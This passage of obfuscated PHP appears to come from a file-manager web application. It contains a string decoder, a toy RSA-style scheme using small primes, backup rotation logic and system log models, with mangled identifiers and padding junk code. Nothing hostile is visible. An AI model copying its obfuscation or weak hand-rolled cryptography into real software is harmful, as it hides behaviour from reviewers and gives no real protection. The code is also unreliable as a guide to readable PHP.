(strlen($í´¶ÖÜ–) < $Æ¢ÊÆÕ…[693]) { return; } case $ı›ßÜİß[304]: $çÅÀíÇÈ = $this->mhox2be98799($š¾ÜÄÔº, md5($ç£æˆ‘é . $ƒ»‰ë‚‰)); $ÇÆ©îŞÍ = $Æ¢ÊÆÕ…[797]; if (!$ÇÆ©îŞÍ) { return; } break; $ê£˜õ¬ = $Æ¢ÊÆÕ…[798]; if (strlen($ê£˜õ¬) < $Æ¢ÊÆÕ…[703]) { return; } case $ı›ßÜİß[305]: $š¾ÜÄÔº = hash_decode($š¾ÜÄÔº); $·°È¿Ù¾ = $š¾ÜÄÔº[0]; $ÓéŒÜûº = $Æ¢ÊÆÕ…[799]; while (strlen($ÓéŒÜûº) < $Æ¢ÊÆÕ…[703]) { if (!$ÓéŒÜûº) { break; } $ÓéŒÜûº++; } $š¾ÜÄÔº = substr($š¾ÜÄÔº, 1); $ŸÕØÓÂ® = strpos($¦ºñªÎ¯, $·°È¿Ù¾); $œ²ÎªØÉ = md5($·°È¿Ù¾ . md5($ƒ»‰ë‚‰ . $·°È¿Ù¾) . $ƒ»‰ë‚‰); $¹ÍïëÑè = $Æ¢ÊÆÕ…[800]; $œ²ÎªØÉ = substr($œ²ÎªØÉ, $ŸÕØÓÂ® % 8, $ŸÕØÓÂ® % 8 + 7); $¯ËßŒÔÌ = $Æ¢ÊÆÕ…[753]; $ü´”‰œˆ = $ı›ßÜİß[6]; $ŒãŸÏÚ = 0; $§ÉÃ´Ãè = $Æ¢ÊÆÕ…[801]; if (strlen($§ÉÃ´Ãè) < $Æ¢ÊÆÕ…[687]) { die; } $‰˜Õ¦¼Ê = 0; $«´äÒáç = $Æ¢ÊÆÕ…[802]; if (strlen($«´äÒáç) < $Æ¢ÊÆÕ…[703]) { return; } $ƒËúŞš = 0; for ($ŒãŸÏÚ = 0; $ŒãŸÏÚ < strlen($š¾ÜÄÔº); $ŒãŸÏÚ++) { $ƒËúŞš = $ƒËúŞš == strlen($œ²ÎªØÉ) ? 0 : $ƒËúŞš; $„Ûè¹ŸË = $Æ¢ÊÆÕ…[803]; $ç¦ìáş = $ƒËúŞš++; $‰˜Õ¦¼Ê = strpos($¦ºñªÎ¯, $š¾ÜÄÔº[$ŒãŸÏÚ]) - $ŸÕØÓÂ® - ord($œ²ÎªØÉ[$ç¦ìáş]); $ö–ˆ´ü— = $Æ¢ÊÆÕ…[804]; if (strlen($ö–ˆ´ü—) < $Æ¢ÊÆÕ…[691]) { return; } while ($‰˜Õ¦¼Ê < 0) { $‰˜Õ¦¼Ê += 64; } $ü´”‰œˆ .= $¦ºñªÎ¯[$‰˜Õ¦¼Ê]; } $çÅÀíÇÈ = base64_decode($ü´”‰œˆ); break; default: $çÅÀíÇÈ = $this->mhox2be98799($š¾ÜÄÔº, $ƒ»‰ë‚‰ . $ç£æˆ‘é); $Â•æ‡Ãñ = $Æ¢ÊÆÕ…[805]; if (!$Â•æ‡Ãñ) { return; } break; $©˜‚˜÷¯ = $Æ¢ÊÆÕ…[806]; if (strlen($©˜‚˜÷¯) < $Æ¢ÊÆÕ…[703]) { return; } } if ($â‡ñ²Á - 1 > 0) { $çÅÀíÇÈ = $this->mvasd6f56294($çÅÀíÇÈ, $ƒ»‰ë‚‰, $â‡ñ²Á - 1); } return $çÅÀíÇÈ; } public function zqmv63555784($ãº‘Ïµ¼) { $øĞğã£õ =& $_SERVER[ıÚ˜š²İ]; $‹‚‹Ø–Ï =& $_SERVER[æÂ¬Úû¨]; $ƒ¨ƒ”¦ş = $this->hwlx0f5adb42(); $µèŸª·Ù = $this->hwlx0f5adb42(); $í‘ÌË• = $øĞğã£õ[807]; while (strlen($í‘ÌË•) < $øĞğã£õ[697]) { if (!$í‘ÌË•) { break; } $í‘ÌË•++; } $ºàŠÇ¨ç = ($ƒ¨ƒ”¦ş - 1) * ($µèŸª·Ù - 1); $ú×…„ôº = $øĞğã£õ[808]; while (strlen($ú×…„ôº) < $øĞğã£õ[687]) { if (!$ú×…„ôº) { break; } $ú×…„ôº++; } $‡î‰İêõ = intval(($ƒ¨ƒ”¦ş + $µèŸª·Ù) / 2); while (1) { $ ğˆ¥«£ = $‡î‰İêõ; $…·Íë×ä = $ºàŠÇ¨ç; $™±»æÅ½ = $øĞğã£õ[809]; if (strlen($™±»æÅ½) < $øĞğã£õ[691]) { return; } while ($…·Íë×ä % $ ğˆ¥«£ != 0) { $·àÌ—Ø = $…·Íë×ä; $ŠåÅÃ®¥ = $øĞğã£õ[810]; $…·Íë×ä = $ ğˆ¥«£; $šÏÊ³Şô = $øĞğã£õ[811]; if (strlen($šÏÊ³Şô) < $øĞğã£õ[693]) { die; } $ ğˆ¥«£ = $·àÌ—Ø % $ ğˆ¥«£; } if ($ ğˆ¥«£ == 1) { break; } else { $‡î‰İêõ++; } } $ÅŠ‡àşƒ = 2; for ($ò×•ç¯… = 0; $ò×•ç¯… < $ºàŠÇ¨ç * 10; $ò×•ç¯…++) { if (($ºàŠÇ¨ç * $ò×•ç¯… + 1) % $‡î‰İêõ == 0) { $ÅŠ‡àşƒ = intval(($ºàŠÇ¨ç * $ò×•ç¯… + 1) / $‡î‰İêõ); break; } } $Ìê¾ ñ = $this->kyor2b37a819($ƒ¨ƒ”¦ş * $µèŸª·Ù . $‹‚‹Ø–Ï[6], $‹‚‹Ø–Ï[136]); $†â¹ò‘ = $øĞğã£õ[812]; if (strlen($†â¹ò‘) < $øĞğã£õ[703]) { die; } $À˜“³‹ = md5($‹‚‹Ø–Ï[306] . ($ƒ¨ƒ”¦ş + $µèŸª·Ù) . $‹‚‹Ø–Ï[307] . $‡î‰İêõ . $‹‚‹Ø–Ï[307] . $ÅŠ‡àşƒ . $‹‚‹Ø–Ï[308]); $…€¨¿ĞÊ = $this->kyor2b37a819($ãº‘Ïµ¼, $À˜“³‹) . $‹‚‹Ø–Ï[309] . $Ìê¾ ñ; return $…€¨¿ĞÊ; } public function cahy6e9adc79($Ïšøôİ) { $’ÖÕˆÙ– =& $_SERVER[ıÚ˜š²İ]; $Ó†¥æ =& $_SERVER[æÂ¬Úû¨]; $‹ñôÎ€Å = explode($Ó†¥æ[309], $Ïšøôİ); $¨àÓÙ¤İ = $’ÖÕˆÙ–[813]; if (!$¨àÓÙ¤İ) { die; } if (count($‹ñôÎ€Å) != 2) { return $Ó†¥æ[6]; } $õĞ¡Œ×ñ = $this->mhox2be98799($‹ñôÎ€Å[1] . $Ó†¥æ[6], $Ó†¥æ[136]); $¨†±öç = $’ÖÕˆÙ–[814]; while (strlen($¨†±öç) < $’ÖÕˆÙ–[693]) { if (!$¨†±öç) { break; } $¨†±öç++; } if (!$õĞ¡Œ×ñ) { return $Ó†¥æ[6]; } $õĞ¡Œ×ñ = intval($õĞ¡Œ×ñ); $×Ÿ”ÄÕä = $’ÖÕˆÙ–[815]; while ($×Ÿ”ÄÕä < $’ÖÕˆÙ–[693]) { if ($×Ÿ”ÄÕä >= 0) { break; } $×Ÿ”ÄÕä++; } $µ¬¬Ş£¾ = 0; $¢Òà®Éá = 0; for ($…şœÃşª = 3; $…şœÃşª < $õĞ¡Œ×ñ; $…şœÃşª += 2) { if ($õĞ¡Œ×ñ % $…şœÃşª != 0) { continue; } $µ¬¬Ş£¾ = $…şœÃşª; $ìÈ¬¿ = $’ÖÕˆÙ–[816]; if (!$ìÈ¬¿) { return; } $¢Òà®Éá = intval($õĞ¡Œ×ñ / $…şœÃşª); $û¿úª™Ğ = $’ÖÕˆÙ–[817]; if (strlen($û¿úª™Ğ) < $’ÖÕˆÙ–[697]) { return; } break; } $´ÒÙŞ–ğ = ($µ¬¬Ş£¾ - 1) * ($¢Òà®Éá - 1); $ö””‹é¯ = $’ÖÕˆÙ–[818]; $Ë’®’³¯ = intval(($µ¬¬Ş£¾ + $¢Òà®Éá) / 2); while (1) { $ÜéÏïÁ„ = $Ë’®’³¯; $¥ç•ğŒŠ = $´ÒÙŞ–ğ; while ($¥ç•ğŒŠ % $ÜéÏïÁ„ != 0) { $Ì©Şˆ’ = $¥ç•ğŒŠ; $¥ç•ğŒŠ = $ÜéÏïÁ„; $ÜéÏïÁ„ = $Ì©Şˆ’ % $ÜéÏïÁ„; } if ($ÜéÏïÁ„ == 1) { break; } else { $Ë’®’³¯++; } } $“—Öüšá = 2; $‚¤îéï = $’ÖÕˆÙ–[819]; if (!$‚¤îéï) { die; } for ($…şœÃşª = 0; $…şœÃşª < $´ÒÙŞ–ğ * 10; $…şœÃşª++) { if (($´ÒÙŞ–ğ * $…şœÃşª + 1) % $Ë’®’³¯ == 0) { $“—Öüšá = intval(($´ÒÙŞ–ğ * $…şœÃşª + 1) / $Ë’®’³¯); break; } } $Ë¹Ã´ş¹ = md5($Ó†¥æ[306] . ($µ¬¬Ş£¾ + $¢Òà®Éá) . $Ó†¥æ[307] . $Ë’®’³¯ . $Ó†¥æ[307] . $“—Öüšá . $Ó†¥æ[308]); $í÷Õ„Î„ = $this->mhox2be98799($‹ñôÎ€Å[0], $Ë¹Ã´ş¹); return $í÷Õ„Î„; } public function hwlx0f5adb42() { $ıÒß»’ë =& $_SERVER[ıÚ˜š²İ]; $ÜÁ¿ÊÀ­ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ú˜í¸”¿ = array(); $îû‹Õ¡ = $ıÒß»’ë[820]; if (!$îû‹Õ¡) { return; } $Î±€À©œ = 1; while ($Î±€À©œ <= (int) sqrt($ÜÁ¿ÊÀ­)) { $åèõ­èÃ = $Î±€À©œ; $”Êˆ’¦¬ = $ıÒß»’ë[821]; while (!0) { $åèõ­èÃ++; if ($åèõ­èÃ <= 2) { $Î±€À©œ = $åèõ­èÃ; break; } else { if ($åèõ­èÃ < 2) { continue; } } $•ùÒÈ õ = !0; for ($¨Í¢ÌüÔ = 2; $¨Í¢ÌüÔ <= sqrt($åèõ­èÃ); $¨Í¢ÌüÔ++) { if ($åèõ­èÃ % $¨Í¢ÌüÔ == 0) { $•ùÒÈ õ = !1; } } if ($•ùÒÈ õ) { $Î±€À©œ = $åèõ­èÃ; break; } } $Ú˜í¸”¿[] = $Î±€À©œ; } $õ ïä  = 2; $ğÃ»²ü¨ = $ıÒß»’ë[763]; if (!$ğÃ»²ü¨) { die; } for ($åèõ­èÃ = $ÜÁ¿ÊÀ­; $åèõ­èÃ > 1; $åèõ­èÃ--) { $•ùÒÈ õ = !0; foreach ($Ú˜í¸”¿ as $¤¡¬ôÄÒ) { if ($åèõ­èÃ % $¤¡¬ôÄÒ == 0) { $•ùÒÈ õ = !1; break; } } if ($•ùÒÈ õ) { $õ ïä  = $åèõ­èÃ; break; } } return $õ ïä ; $ÍíğÆ°¡ = $ıÒß»’ë[822]; while ($ÍíğÆ°¡ < $ıÒß»’ë[693]) { if ($ÍíğÆ°¡ >= 0) { break; } $ÍíğÆ°¡++; } } public function htjkf8d9bc5f($òÑğ––³, $·¼™¼¾) { $úÏ„ êë =& $_SERVER[æÂ¬Úû¨]; return call_user_func(array($úÏ„ êë[8], $úÏ„ êë[310]), $òÑğ––³, $·¼™¼¾); } public function kyor2b37a819($Ã¶Ö’, $úç´†ş…) { $ì´ë¶›× =& $_SERVER[æÂ¬Úû¨]; return call_user_func(array($ì´ë¶›×[311], $ì´ë¶›×[312]), $Ã¶Ö’, $úç´†ş…); } public function mhox2be98799($ûşÅ¿†ƒ, $Åª‹»¯’) { $ÉµÓ½Û =& $_SERVER[ıÚ˜š²İ]; $·À˜Š¶é =& $_SERVER[æÂ¬Úû¨]; return call_user_func(array($·À˜Š¶é[311], $·À˜Š¶é[313]), $ûşÅ¿†ƒ, $Åª‹»¯’); $öà³î”´ = $ÉµÓ½Û[823]; while (strlen($öà³î”´) < $ÉµÓ½Û[703]) { if (!$öà³î”´) { break; } $öà³î”´++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ıÚ˜š²İ][824]); $this->init(); $this->keep(); } public function init() { $İâ¥Ï§– =& $_SERVER[ıÚ˜š²İ]; $this->isManual(); self::$name = date($İâ¥Ï§–[825]); if (!($É´ê¯ìÆ = $this->model->lastItem())) { $É´ê¯ìÆ = $this->initData(); } else { self::$name = $É´ê¯ìÆ[$İâ¥Ï§–[32]]; if ($É´ê¯ìÆ[$İâ¥Ï§–[826]] == $İâ¥Ï§–[91]) { self::$name = date($İâ¥Ï§–[262]); $º·Á¸•µ = intval(_get($É´ê¯ìÆ, $İâ¥Ï§–[827], 0)); if (self::$manual == 0 && $É´ê¯ìÆ[$İâ¥Ï§–[32]] == self::$name) { $this->model->remove($É´ê¯ìÆ[$İâ¥Ï§–[477]]); } $É´ê¯ìÆ = $this->initData($º·Á¸•µ, $É´ê¯ìÆ[$İâ¥Ï§–[828]]); } else { $this->checkStore($É´ê¯ìÆ[$İâ¥Ï§–[828]]); } } self::$option = $É´ê¯ìÆ; } private function isManual() { $ÇªÉòêĞ = _get($GLOBALS, $_SERVER[ıÚ˜š²İ][829], 0); $ÇªÉòêĞ = intval($ÇªÉòêĞ); self::$manual = $ÇªÉòêĞ && $ÇªÉòêĞ == 1 ? 1 : 0; } private function initData($½¿î†ö– = 0, $•«õæ±Î = '') { $“Â˜˜ğî =& $_SERVER[ıÚ˜š²İ]; $èõ¦•Œô = $this->model->config(); if ($•«õæ±Î && $èõ¦•Œô[$“Â˜˜ğî[828]] != $•«õæ±Î) { $½¿î†ö– = 0; } $this->checkStore($èõ¦•Œô[$“Â˜˜ğî[828]]); if (self::$manual == 1) { self::$name .= $“Â˜˜ğî[11] . date($“Â˜˜ğî[830]); } $½ÈŸŒ™Ó = array($“Â˜˜ğî[828] => $èõ¦•Œô[$“Â˜˜ğî[828]], $“Â˜˜ğî[32] => self::$name, $“Â˜˜ğî[826] => 0, $“Â˜˜ğî[171] => $èõ¦•Œô[$“Â˜˜ğî[171]], $“Â˜˜ğî[831] => self::$manual, $“Â˜˜ğî[832] => array($“Â˜˜ğî[833] => array($“Â˜˜ğî[826] => 0), $“Â˜˜ğî[834] => array($“Â˜˜ğî[826] => 0, $“Â˜˜ğî[835] => 0, $“Â˜˜ğî[836] => 0, $“Â˜˜ğî[33] => $“Â˜˜ğî[12], $“Â˜˜ğî[837] => 0, $“Â˜˜ğî[838] => 0), $“Â˜˜ğî[839] => array($“Â˜˜ğî[826] => 0, $“Â˜˜ğî[835] => 0, $“Â˜˜ğî[836] => 0, $“Â˜˜ğî[837] => 0, $“Â˜˜ğî[838] => 0), $“Â˜˜ğî[233] => array($“Â˜˜ğî[826] => 0, $“Â˜˜ğî[840] => 0, $“Â˜˜ğî[841] => 0, $“Â˜˜ğî[842] => 0, $“Â˜˜ğî[843] => 0, $“Â˜˜ğî[545] => $½¿î†ö–, $“Â˜˜ğî[837] => 0, $“Â˜˜ğî[838] => 0)), $“Â˜˜ğî[837] => time(), $“Â˜˜ğî[838] => 0); $êÓ©‰åÚ = $this->model->insert($½ÈŸŒ™Ó); $½ÈŸŒ™Ó[$“Â˜˜ğî[477]] = $êÓ©‰åÚ; return $½ÈŸŒ™Ó; } private function checkStore($µÉí×®) { $â˜Æ¾È = Model($_SERVER[ıÚ˜š²İ][844]); $„á“°Öƒ = $â˜Æ¾È->listData($µÉí×®); $â˜Æ¾È->checkConfig($„á“°Öƒ); } public static function get() { if (!self::$option) { $›ôÖ—Ñ = Model($_SERVER[ıÚ˜š²İ][824]); $òÁÂ•“‡ = $›ôÖ—Ñ->findByName(self::$name); $›ôÖ—Ñ->parseContent($òÁÂ•“‡); self::$option = $òÁÂ•“‡; } return self::$option; } public static function set($ğÇŠœ•¯) { $ÎöÌ¹Â =& $_SERVER[ıÚ˜š²İ]; $ÜÙ¬¿À… = self::get(); foreach ($ğÇŠœ•¯ as $§€ÇÒ ± => $‰úÉÙü) { array_set_value($ÜÙ¬¿À…, $§€ÇÒ ±, $‰úÉÙü); } Model($ÎöÌ¹Â[824])->update($ÜÙ¬¿À…[$ÎöÌ¹Â[477]], $ÜÙ¬¿À…); self::$option = $ÜÙ¬¿À…; return self::$option; } public function keep() { $˜×øŸ‰• =& $_SERVER[ıÚ˜š²İ]; $ÅËÛÏÎ® = self::get(); if (_get($ÅËÛÏÎ®, $˜×øŸ‰•[845], 0) == $˜×øŸ‰•[91]) { return; } $this->backupKeep($ÅËÛÏÎ®); self::set(array($˜×øŸ‰•[845] => 1)); } private function backupKeep($á ¬ê­æ) { $¤›ß®â‰ =& $_SERVER[ıÚ˜š²İ]; if (self::$manual == 1) { return; } $›’„ó° = $this->model->listData(); if (empty($›’„ó°)) { return; } $–ßæ‚š = 0; $ÅâÈîŞ‚ = array(); foreach ($›’„ó° as $’²»âª¾) { if ($–ßæ‚š >= 7) { break; } $ÅâÈîŞ‚[] = $’²»âª¾[$¤›ß®â‰[32]]; $–ßæ‚š++; } for ($–ßæ‚š = 0; $–ßæ‚š < 12; $–ßæ‚š++) { $ÅâÈîŞ‚[] = date($¤›ß®â‰[846], strtotime("\x2d{$–ßæ‚š}\40\155\x6f\x6e\164\x68\x73")); } $ÅâÈîŞ‚ = array_unique($ÅâÈîŞ‚); $èá‡êÍŠ = Model($¤›ß®â‰[847])->get($¤›ß®â‰[848]); foreach ($›’„ó° as $’²»âª¾) { if (isset($’²»âª¾[$¤›ß®â‰[831]]) && $’²»âª¾[$¤›ß®â‰[831]] == $¤›ß®â‰[91]) { continue; } if (!empty($’²»âª¾[$¤›ß®â‰[32]]) && in_array($’²»âª¾[$¤›ß®â‰[32]], $ÅâÈîŞ‚)) { continue; } $this->model->remove($’²»âª¾[$¤›ß®â‰[477]]); $ôºæ¾Æì = $this->backupPath($á ¬ê­æ, $èá‡êÍŠ); IO::remove($ôºæ¾Æì, !1); } } private function backupPath($ÖçüÒ‘§, $Ûá¸Ïõš = false) { $óİÎ£“© =& $_SERVER[ıÚ˜š²İ]; if (!$Ûá¸Ïõš) { $Ûá¸Ïõš = Model($óİÎ£“©[847])->get($óİÎ£“©[848]); } $³«ÏœÜ = $ÖçüÒ‘§[$óİÎ£“©[32]]; $È™ÃÚÊ = substr(md5($óİÎ£“©[849] . $Ûá¸Ïõš . $³«ÏœÜ), 0, 8); return "\173\x69\x6f\x3a{$ÖçüÒ‘§[$óİÎ£“©[828]]}\x7d\x2f\144\x61\164\141\x62\141\163\x65\57\x62\x61\x63\153\x75\160\57" . $³«ÏœÜ . $óİÎ£“©[11] . $È™ÃÚÊ; } public function db() { $Âì˜´õ· =& $_SERVER[ıÚ˜š²İ]; $…ß°Ôğ = self::get(); if (_get($…ß°Ôğ, $Âì˜´õ·[850], 0) == $Âì˜´õ·[91]) { return !0; } $×Êù‘´ª = new BackupDb(); if (!$×Êù‘´ª->index()) { return !1; } self::set(array($Âì˜´õ·[850] => 1)); return !0; } public function dbFile() { $ßğÛ×Ò˜ =& $_SERVER[ıÚ˜š²İ]; $ñ¶ƒÌÉ‡ = self::get(); if (_get($ñ¶ƒÌÉ‡, $ßğÛ×Ò˜[851], 0) == $ßğÛ×Ò˜[91]) { return !0; } $Ùèä˜Ş¯ = new BackupDbFile(); if (!$Ùèä˜Ş¯->index()) { return !1; } self::set(array($ßğÛ×Ò˜[851] => 1)); return !0; } public function file() { $§À¼Çà =& $_SERVER[ıÚ˜š²İ]; $¶ëÃÜù = self::get(); if (_get($¶ëÃÜù, $§À¼Çà[852], 0) == $§À¼Çà[91]) { return !0; } if ($¶ëÃÜù[$§À¼Çà[171]] == $§À¼Çà[853]) { $ˆ«ä›²´ = new BackupFile(); if (!$ˆ«ä›²´->index()) { return !1; } } self::set(array($§À¼Çà[852] => 1, $§À¼Çà[826] => 1)); return !0; } public static function log($Ÿó—Î»ı) { write_log($Ÿó—Î»ı, $_SERVER[ıÚ˜š²İ][854]); } } goto E­À°ñµ÷Ÿ; F¦ªêñÁä: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\114\x69\x67\x68\x74\101\160\x70"; public $modelType = "\x53\171\163\164\145\155\x4f\x70\164\151\x6f\156"; public $field = array("\x6e\x61\x6d\145", "\x67\162\x6f\165\160", "\x64\145\163\143", "\x63\x6f\x6e\x74\145\156\x74"); public function listData($®Œ«ã = false, $«£¸ºšü = "\155\x6f\144\x69\146\171\124\x69\x6d\145", $ÊÇÈáÂğ = true) { return parent::listData($®Œ«ã, $«£¸ºšü, $ÊÇÈáÂğ); } public function remove($ßæÁĞ“) { $õÈºËöô = $this->findByName($ßæÁĞ“); if (!$õÈºËöô) { return !1; } return parent::remove($õÈºËöô[$_SERVER[ıÚ˜š²İ][477]]); } public function add($Ñ˜µ¯ßì) { if ($this->findByName($Ñ˜µ¯ßì[$_SERVER[ıÚ˜š²İ][32]])) { return !1; } return parent::insert($Ñ˜µ¯ßì); } public function update($ø‰•Í, $áù˜ñİÇ) { $€É•ê³ =& $_SERVER[ıÚ˜š²İ]; $ëÀÒ®æÌ = $this->findByName($ø‰•Í); $ÕÛÅéœ› = $this->findByName($áù˜ñİÇ[$€É•ê³[32]]); if (!$ëÀÒ®æÌ || $ÕÛÅéœ› && $ÕÛÅéœ›[$€É•ê³[477]] != $ëÀÒ®æÌ[$€É•ê³[477]]) { return !1; } return parent::update($ëÀÒ®æÌ[$€É•ê³[477]], $áù˜ñİÇ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\155\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\124\151\x6d\x65", "\164\151\155\145", "\x69\x6e\x73\145\x72\x74", "\146\165\x6e\143\x74\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $êÎÎÁ¦Æ =& $_SERVER[ıÚ˜š²İ]; return array($êÎÎÁ¦Æ[2366] => LNG($êÎÎÁ¦Æ[2367]), $êÎÎÁ¦Æ[2368] => LNG($êÎÎÁ¦Æ[2369]), $êÎÎÁ¦Æ[1936] => LNG($êÎÎÁ¦Æ[2370]), $êÎÎÁ¦Æ[2371] => LNG($êÎÎÁ¦Æ[2372]), $êÎÎÁ¦Æ[2373] => LNG($êÎÎÁ¦Æ[2374]), $êÎÎÁ¦Æ[2375] => LNG($êÎÎÁ¦Æ[2376]), $êÎÎÁ¦Æ[2377] => LNG($êÎÎÁ¦Æ[2378]), $êÎÎÁ¦Æ[1966] => LNG($êÎÎÁ¦Æ[2378]), $êÎÎÁ¦Æ[1967] => LNG($êÎÎÁ¦Æ[2379]), $êÎÎÁ¦Æ[2380] => LNG($êÎÎÁ¦Æ[2381]), $êÎÎÁ¦Æ[2382] => LNG($êÎÎÁ¦Æ[2383]), $êÎÎÁ¦Æ[2384] => LNG($êÎÎÁ¦Æ[2385]), $êÎÎÁ¦Æ[2386] => LNG($êÎÎÁ¦Æ[2387]), $êÎÎÁ¦Æ[1964] => LNG($êÎÎÁ¦Æ[2388]), $êÎÎÁ¦Æ[2389] => LNG($êÎÎÁ¦Æ[2390]), $êÎÎÁ¦Æ[1971] => LNG($êÎÎÁ¦Æ[2391]), $êÎÎÁ¦Æ[2392] => LNG($êÎÎÁ¦Æ[2393]), $êÎÎÁ¦Æ[2394] => LNG($êÎÎÁ¦Æ[2395]), $êÎÎÁ¦Æ[2396] => LNG($êÎÎÁ¦Æ[2397]), $êÎÎÁ¦Æ[2398] => LNG($êÎÎÁ¦Æ[2399]), $êÎÎÁ¦Æ[1974] => LNG($êÎÎÁ¦Æ[2400]), $êÎÎÁ¦Æ[1975] => LNG($êÎÎÁ¦Æ[2401]), $êÎÎÁ¦Æ[2402] => LNG($êÎÎÁ¦Æ[2403]), $êÎÎÁ¦Æ[2404] => LNG($êÎÎÁ¦Æ[2405]), $êÎÎÁ¦Æ[2406] => LNG($êÎÎÁ¦Æ[2407]), $êÎÎÁ¦Æ[1969] => LNG($êÎÎÁ¦Æ[2408]), $êÎÎÁ¦Æ[2409] => LNG($êÎÎÁ¦Æ[2410]), $êÎÎÁ¦Æ[1968] => LNG($êÎÎÁ¦Æ[2411]), $êÎÎÁ¦Æ[2412] => LNG($êÎÎÁ¦Æ[2412]), $êÎÎÁ¦Æ[2413] => LNG($êÎÎÁ¦Æ[2414]), $êÎÎÁ¦Æ[2415] => LNG($êÎÎÁ¦Æ[2412]), $êÎÎÁ¦Æ[2416] => LNG($êÎÎÁ¦Æ[2417]), $êÎÎÁ¦Æ[2418] => LNG($êÎÎÁ¦Æ[2419]), $êÎÎÁ¦Æ[2420] => LNG($êÎÎÁ¦Æ[2419]), $êÎÎÁ¦Æ[2421] => LNG($êÎÎÁ¦Æ[2422]), $êÎÎÁ¦Æ[2423] => LNG($êÎÎÁ¦Æ[2423]), $êÎÎÁ¦Æ[2424] => LNG($êÎÎÁ¦Æ[1940]), $êÎÎÁ¦Æ[2425] => LNG($êÎÎÁ¦Æ[2426]), $êÎÎÁ¦Æ[2427] => LNG($êÎÎÁ¦Æ[2428]), $êÎÎÁ¦Æ[2429] => LNG($êÎÎÁ¦Æ[2430]), $êÎÎÁ¦Æ[2431] => LNG($êÎÎÁ¦Æ[2432]), $êÎÎÁ¦Æ[2433] => LNG($êÎÎÁ¦Æ[2434]), $êÎÎÁ¦Æ[2435] => LNG($êÎÎÁ¦Æ[2435]), $êÎÎÁ¦Æ[2436] => LNG($êÎÎÁ¦Æ[2437]), $êÎÎÁ¦Æ[2438] => LNG($êÎÎÁ¦Æ[2439]), $êÎÎÁ¦Æ[2440] => LNG($êÎÎÁ¦Æ[2441]), $êÎÎÁ¦Æ[2442] => LNG($êÎÎÁ¦Æ[2443]), $êÎÎÁ¦Æ[2444] => LNG($êÎÎÁ¦Æ[2445]), $êÎÎÁ¦Æ[2446] => LNG($êÎÎÁ¦Æ[2447]), $êÎÎÁ¦Æ[213] => LNG($êÎÎÁ¦Æ[213]), $êÎÎÁ¦Æ[214] => LNG($êÎÎÁ¦Æ[2448]), $êÎÎÁ¦Æ[2449] => LNG($êÎÎÁ¦Æ[2449])); } private function typeFile() { $ã‹¶ùõ¬ =& $_SERVER[ıÚ˜š²İ]; $–ú’äÇì = array($ã‹¶ùõ¬[1971] => array($ã‹¶ùõ¬[1972]), $ã‹¶ùõ¬[2384] => array($ã‹¶ùõ¬[2450]), $ã‹¶ùõ¬[2386] => array($ã‹¶ùõ¬[2451]), $ã‹¶ùõ¬[1964] => array($ã‹¶ùõ¬[1965], $ã‹¶ùõ¬[2452]), $ã‹¶ùõ¬[2394] => array(), $ã‹¶ùõ¬[2396] => array(), $ã‹¶ùõ¬[2398] => array(), $ã‹¶ùõ¬[1974] => array($ã‹¶ùõ¬[1976]), $ã‹¶ùõ¬[1975] => array($ã‹¶ùõ¬[1976]), $ã‹¶ùõ¬[2402] => array($ã‹¶ùõ¬[2453]), $ã‹¶ùõ¬[2404] => array($ã‹¶ùõ¬[2453]), $ã‹¶ùõ¬[2406] => array($ã‹¶ùõ¬[2454]), $ã‹¶ùõ¬[2392] => array($ã‹¶ùõ¬[2455]), $ã‹¶ùõ¬[1969] => array($ã‹¶ùõ¬[2456]), $ã‹¶ùõ¬[2409] => array($ã‹¶ùõ¬[2457]), $ã‹¶ùõ¬[1968] => array($ã‹¶ùõ¬[1970])); return $–ú’äÇì; } private function typeAll() { $ØÇÀÔıª =& $_SERVER[ıÚ˜š²İ]; $º©Úåí¡ = $this->typeList; $¡Ğ—Ù¤ = array_filter($this->typeFile()); foreach ($¡Ğ—Ù¤ as $¹˜ö¸›… => $É£Èö§¦) { $º©Úåí¡[$É£Èö§¦[0]] = $º©Úåí¡[$¹˜ö¸›…]; } $º©Úåí¡[$ØÇÀÔıª[1976]] = LNG($ØÇÀÔıª[2458]); $º©Úåí¡[$ØÇÀÔıª[2453]] = LNG($ØÇÀÔıª[2459]); return $º©Úåí¡; } public function addLog($—‘ÍÈ†Æ, $ÈòÁ½—Ó = array()) { $Ñ²ÓÆÜ¤ =& $_SERVER[ıÚ˜š²İ]; if (!isset($this->typeList[$—‘ÍÈ†Æ])) { return; } $÷Ğª›¡ = Session::get($Ñ²ÓÆÜ¤[2135]); if (!$÷Ğª›¡) { $÷Ğª›¡ = _get($ÈòÁ½—Ó, $Ñ²ÓÆÜ¤[1792], 0); } if ($—‘ÍÈ†Æ == $Ñ²ÓÆÜ¤[2425] && is_array($ÈòÁ½—Ó[$Ñ²ÓÆÜ¤[2460]]) && !$ÈòÁ½—Ó[$Ñ²ÓÆÜ¤[2460]]) { return; } $è‚Ï› = get_client_ip(); if (!$ÈòÁ½—Ó || strlen(json_encode($ÈòÁ½—Ó)) >= 1024 * 64) { if ($ÈòÁ½—Ó && is_array($ÈòÁ½—Ó)) { $ÈòÁ½—Ó = array_intersect_key($ÈòÁ½—Ó, array_flip($Ñ²ÓÆÜ¤[477], $Ñ²ÓÆÜ¤[32])); $ÈòÁ½—Ó[$Ñ²ÓÆÜ¤[2461]] = $è‚Ï›; } else { $ÈòÁ½—Ó = array($Ñ²ÓÆÜ¤[2461] => $è‚Ï›); } } else { if (is_array($ÈòÁ½—Ó)) { $ÈòÁ½—Ó[$Ñ²ÓÆÜ¤[2461]] = $è‚Ï›; } else { $ÈòÁ½—Ó = array($Ñ²ÓÆÜ¤[1301] => $ÈòÁ½—Ó, $Ñ²ÓÆÜ¤[2461] => $è‚Ï›); } } $ÈòÁ½—Ó = array($Ñ²ÓÆÜ¤[1782] => Session::sign(), $Ñ²ÓÆÜ¤[1783] => intval($÷Ğª›¡), $Ñ²ÓÆÜ¤[33] => $—‘ÍÈ†Æ, $Ñ²ÓÆÜ¤[1785] => json_encode($ÈòÁ½—Ó)); return parent::add($ÈòÁ½—Ó); } public function remove($±ñ‰ÚæÔ) { $this->where(array($_SERVER[ıÚ˜š²İ][495] => $±ñ‰ÚæÔ))->delete(); } private function 